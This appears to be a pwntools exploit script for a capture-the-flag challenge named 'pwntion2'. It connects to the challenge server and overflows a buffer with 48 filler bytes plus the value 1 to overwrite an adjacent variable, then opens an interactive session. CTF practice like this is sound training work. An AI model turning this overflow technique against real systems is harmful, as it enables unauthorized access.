from pwn import *

debug = False
if debug == True:
    r = process("./pwntion2")
else:
    r = remote("pwntion2.tghack.no", 1062)

r.recvuntil("Student:\n")
r.sendline("A"*48 + "\x01\x00\x00\x00")

r.interactive()
